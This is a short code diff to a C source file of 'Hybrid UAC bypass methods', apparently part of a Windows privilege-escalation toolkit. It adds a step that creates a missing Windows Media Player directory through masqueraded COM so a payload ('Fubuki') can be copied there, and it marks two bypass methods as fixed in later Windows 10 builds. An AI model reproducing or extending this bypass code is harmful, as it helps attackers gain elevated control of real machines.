@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.01
 *
-*  DATE:        27 Aug 2018
+*  DATE:        30 Sep 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1577,6 +1577,15 @@ BOOL ucmUiAccessMethod(
         _strcat(szTarget, TEXT("\\"));
 
         //
+        // In case if Media Player is not installed / available.
+        // Note: additional check of g_lpIncludedPFDirs?
+        //
+        if (!PathFileExists(szTarget)) {
+            if (!ucmMasqueradedCreateSubDirectoryCOM(lpEnv, T_WINDOWSMEDIAPLAYER))
+                break;
+        }
+
+        //
         // Copy Fubuki to target directory.
         // 
         if (!ucmMasqueradedMoveFileCOM(szSource, szTarget))
@@ -1999,7 +2008,7 @@ BOOL ucmCorProfilerMethod(
 * Bypass UAC using FwCplLua undocumented COM interface and mscfile registry hijack.
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
-* Produced mixed results since Windows 10 RS4.
+* Fixed in Windows 10 RS4.
 *
 */
 BOOL ucmFwCplLuaMethod(
@@ -2807,6 +2816,8 @@ DWORD ucmxTrackService()
 * elevated start/stop control over w32time service.
 *
 * Used in with deroko method which provide elevated RegSetValueEx functionality.
+*
+* Fixed in Windows 10 RS5.
 *
 */
 BOOL ucmDateTimeStateWriterMethod(
